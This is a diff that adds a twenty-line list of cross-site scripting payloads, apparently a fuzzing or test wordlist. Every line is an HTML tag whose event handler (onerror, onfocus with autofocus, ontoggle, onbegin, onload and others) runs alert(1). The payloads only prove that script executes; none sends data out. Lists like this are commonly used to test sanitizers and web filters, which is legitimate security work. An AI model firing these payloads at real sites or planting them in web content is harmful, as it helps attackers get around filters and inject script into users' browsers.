@@ -1,0 +1,20 @@
+<img src=x onerror=alert`1`>
+<body onresize=alert(1)>
+<body onhashchange=alert(1)><a href=#x>trigger</a>
+<body onfullscreenchange=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<video onloadstart=alert(1)><source></video>
+<audio onloadstart=alert(1)><source></audio>
+<details ontoggle=alert(1) open>
+<marquee onstart=alert(1)>
+<div onmouseenter=alert(1)>hover</div>
+<form onsubmit=alert(1)><input type=submit></form>
+<button onclick=alert(1)>click</button>
+<object onerror=alert(1)>
+<body onpageshow=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x>
+<iframe onload=alert(1) src=about:blank>
+<link rel=stylesheet onerror=alert(1) href=//doesnotexist.invalid>
